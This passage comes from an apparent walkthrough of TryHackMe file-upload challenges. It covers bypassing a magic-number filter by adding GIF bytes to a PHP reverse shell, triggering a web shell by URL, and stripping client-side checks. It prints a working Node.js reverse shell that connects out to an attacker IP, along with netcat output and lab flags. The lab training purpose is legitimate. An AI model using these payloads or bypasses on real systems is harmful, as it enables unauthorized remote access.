</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>└─$ nc -lvnp <span style="color:#fab387">1234</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>listening on <span style="color:#89dceb;font-weight:bold">[</span>any<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#fab387">1234</span> ...
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>connect to <span style="color:#89dceb;font-weight:bold">[</span>10.6.67.243<span style="color:#89dceb;font-weight:bold">]</span> from <span style="color:#89dceb;font-weight:bold">(</span>UNKNOWN<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>10.10.103.254<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#fab387">56504</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Linux a2b9a5609bd8 4.15.0-109-generic <span style="color:#6c7086;font-style:italic">#110-Ubuntu SMP Tue Jun 23 02:39:32 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span> 03:50:14 up  1:26,  <span style="color:#fab387">0</span> users,  load average: 0.03, 0.01, 0.00
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span><span style="color:#f5e0dc">uid</span><span style="color:#89dceb;font-weight:bold">=</span>33<span style="color:#89dceb;font-weight:bold">(</span>www-data<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#f5e0dc">gid</span><span style="color:#89dceb;font-weight:bold">=</span>33<span style="color:#89dceb;font-weight:bold">(</span>www-data<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#f5e0dc">groups</span><span style="color:#89dceb;font-weight:bold">=</span>33<span style="color:#89dceb;font-weight:bold">(</span>www-data<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>/bin/sh: 0: can<span style="color:#f38ba8">&#39;</span>t access tty; job control turned off
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>$ ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>bin
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>boot
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>dev
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>etc
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>home
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>lib
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>lib32
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>lib64
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>libx32
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>media
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span>mnt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span>opt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span>proc
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">24</span><span>root
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">25</span><span>run
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">26</span><span>sbin
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">27</span><span>srv
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">28</span><span>sys
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">29</span><span>tmp
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">30</span><span>usr
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">31</span><span>var
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">32</span><span>$ <span style="color:#89dceb">cd</span> /var/www
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">33</span><span>$ ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">34</span><span>flag.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">35</span><span>html
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">36</span><span>$ cat flag.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">37</span><span>THM<span style="color:#89dceb;font-weight:bold">{</span>MGEyYzJiYmI3ODIyM2FlNTNkNjZjYjFl<span style="color:#89dceb;font-weight:bold">}</span></span></span></code></pre></div>
<br>
<h3 id="bypassing-server-side-filtering-magic-numbers">Bypassing Server-Side Filtering: Magic Numbers</h3>
<p>Head to magic.uploadvulns.thm &ndash; it&rsquo;s time for the last mini-challenge.</p>
<p>Bypass the magic number filter to upload a shell. Find the location of the uploaded shell and activate it. Your flag is in /var/www/.</p>
<p>Grab the flag from /var/www/</p>






<pre tabindex="0"><code>THM{MWY5ZGU4NzE0ZDlhNjE1NGM4ZThjZDJh}</code></pre>
<br>
<p>The website only accepts GIF type files.</p>
<p><img src="image-21.png#center" alt="alt text"></p>
<br>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>└─$ file shell.php
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>shell.php: PHP script, ASCII text</span></span></code></pre></div>
<p>As you can see, our current shell has the type of PHP script. In order to bypass the magic number filtering, we have to add the GIF magic number to the top of our shell.php file.</p>
<p>GIF has a couple magic numbers but I am going to use <code>47 49 46 38 37 61</code>.</p>
<p>Let&rsquo;s open up the reverse shell script and add four random characters on the first line. This is just a temporary placeholder so these characters do not matter.</p>
<p><img src="image-16.png#center" alt="alt text">
<br></p>
<p>Let&rsquo;s open up the file in <code>hexeditor</code> now. The first line has value of <code>41 41 41 41</code> which represents the values AAAA we put on the first line of the file. Let&rsquo;s change them to JPEG magic numbers, <code>47 49 46 38 37 61</code></p>
<p><img src="image-17.png#center" alt="alt text">
<img src="image-20.png#center" alt="alt text"></p>
<br>
<p>If we run the file command again to see the file type, it now says it&rsquo;s GIF type.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>└─$ file shell.php
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>shell.php: GIF image data, version 87a, <span style="color:#fab387">28735</span> x <span style="color:#fab387">28776</span></span></span></code></pre></div>
<p><img src="image-19.png#center" alt="alt text"></p>
<br>
<p>Let&rsquo;s upload the file now and instead of navigating to <code>/graphics</code> (because directory indexing is turned off for this website), we are going to access the shell directly using its URI like the following:</p>
<p><code>http://magic.uploadvulns.thm/graphics/shell.php?cmd=whoami;</code></p>
<p>As you could see from the below, I was running the netcat server to capture the reverse shell and eventually got the flag.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>└─$ nc -lvnp <span style="color:#fab387">1234</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>listening on <span style="color:#89dceb;font-weight:bold">[</span>any<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#fab387">1234</span> ...
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>connect to <span style="color:#89dceb;font-weight:bold">[</span>10.6.67.243<span style="color:#89dceb;font-weight:bold">]</span> from <span style="color:#89dceb;font-weight:bold">(</span>UNKNOWN<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>10.10.103.254<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#fab387">38598</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Linux 94d79a333b8d 4.15.0-109-generic <span style="color:#6c7086;font-style:italic">#110-Ubuntu SMP Tue Jun 23 02:39:32 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span> 04:35:03 up  2:11,  <span style="color:#fab387">0</span> users,  load average: 0.00, 0.02, 0.01
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span><span style="color:#f5e0dc">uid</span><span style="color:#89dceb;font-weight:bold">=</span>33<span style="color:#89dceb;font-weight:bold">(</span>www-data<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#f5e0dc">gid</span><span style="color:#89dceb;font-weight:bold">=</span>33<span style="color:#89dceb;font-weight:bold">(</span>www-data<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#f5e0dc">groups</span><span style="color:#89dceb;font-weight:bold">=</span>33<span style="color:#89dceb;font-weight:bold">(</span>www-data<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>/bin/sh: 0: can<span style="color:#f38ba8">&#39;</span>t access tty; job control turned off
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>$ ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>bin
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>boot
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>dev
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>etc
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>home
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>lib
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>lib32
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>lib64
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>libx32
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>media
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span>mnt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span>opt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span>proc
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">24</span><span>root
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">25</span><span>run
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">26</span><span>sbin
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">27</span><span>srv
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">28</span><span>sys
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">29</span><span>tmp
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">30</span><span>usr
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">31</span><span>var
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">32</span><span>$ <span style="color:#89dceb">cd</span> /var/www/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">33</span><span>$ ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">34</span><span>flag.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">35</span><span>html
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">36</span><span>$ cat flag.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">37</span><span>THM<span style="color:#89dceb;font-weight:bold">{</span>MWY5ZGU4NzE0ZDlhNjE1NGM4ZThjZDJh<span style="color:#89dceb;font-weight:bold">}</span></span></span></code></pre></div>
<br>
<h3 id="challenge">Challenge</h3>
<p>For this task, we are given a black-box file upload challenge to complete.</p>
<p>Head over to jewel.uploadvulns.thm.</p>
<p>Take what you&rsquo;ve learned in this room and use it to get a shell on this machine. As per usual, your flag is in /var/www/.</p>
<p>Hack the machine and grab the flag from /var/www/</p>






<pre tabindex="0"><code>THM{NzRlYTUwNTIzODMwMWZhMzBiY2JlZWU2}</code></pre>
<br>
<p>Using Burpsuite, I captured the request on the website and the backend is running Javascript, as we can see from the <code>X-Powered-By: Express</code>.</p>
<p><img src="image-24.png#center" alt="alt text"></p>
<p>Also the static <code>upload.js</code> file shows that the upload only accepts <code>jpg or jpeg</code> file format.</p>
<p><img src="image-22.png#center" alt="alt text"></p>
<br>
<p>Since we found the backend is running javascript, we need the javascript version of rever shell script not the PHP that we&rsquo;ve been using so far.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>(<span style="color:#f38ba8">function</span> () {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>  <span style="color:#f38ba8">var</span> net <span style="color:#89dceb;font-weight:bold">=</span> require(<span style="color:#a6e3a1">&#34;net&#34;</span>),
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>    cp <span style="color:#89dceb;font-weight:bold">=</span> require(<span style="color:#a6e3a1">&#34;child_process&#34;</span>),
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>    sh <span style="color:#89dceb;font-weight:bold">=</span> cp.spawn(<span style="color:#a6e3a1">&#34;/bin/sh&#34;</span>, []);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>  <span style="color:#f38ba8">var</span> client <span style="color:#89dceb;font-weight:bold">=</span> <span style="color:#cba6f7">new</span> net.Socket();
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>  client.connect(<span style="color:#fab387">8080</span>, <span style="color:#a6e3a1">&#34;10.17.26.64&#34;</span>, <span style="color:#f38ba8">function</span> () {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>    client.pipe(sh.stdin);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>    sh.stdout.pipe(client);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>    sh.stderr.pipe(client);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>  });
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>  <span style="color:#cba6f7">return</span> <span style="color:#94e2d5">/a/</span>; <span style="color:#6c7086;font-style:italic">// Prevents the Node.js application form crashing
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span><span style="color:#6c7086;font-style:italic"></span>})();</span></span></code></pre></div>
<br>
<p>It seems like we can bypass three checks from the client-side: file size, magic number, and file extension. I am just going to delete all of the checks.
<img src="image-32.png#center" alt="alt text"></p>
<br>
<p>Now the file upload has been successful.</p>
<p><img src="image-27.png#center" alt="alt text">
<br></p>
<p>I&rsquo;ve already found the relative directories for image uploads by using the gobuster command that I&rsquo;ve been using for this room.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>└─$ gobuster dir -u http://jewel.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span><span style="color:#89dceb;font-weight:bold">===============================================================</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Gobuster v3.6
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>by OJ Reeves <span style="color:#89dceb;font-weight:bold">(</span>@TheColonial<span style="color:#89dceb;font-weight:bold">)</span> &amp; Christian Mehlmauer <span style="color:#89dceb;font-weight:bold">(</span>@firefart<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span><span style="color:#89dceb;font-weight:bold">===============================================================</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Url:                     http://jewel.uploadvulns.thm
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Method:                  GET
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Threads:                 <span style="color:#fab387">10</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Negative Status codes:   <span style="color:#fab387">404</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> User Agent:              gobuster/3.6
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Timeout:                 <span style="color:#f5e0dc">10s</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span><span style="color:#89dceb;font-weight:bold">===============================================================</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>Starting gobuster in directory enumeration <span style="color:#f5e0dc">mode</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span><span style="color:#89dceb;font-weight:bold">===============================================================</span>
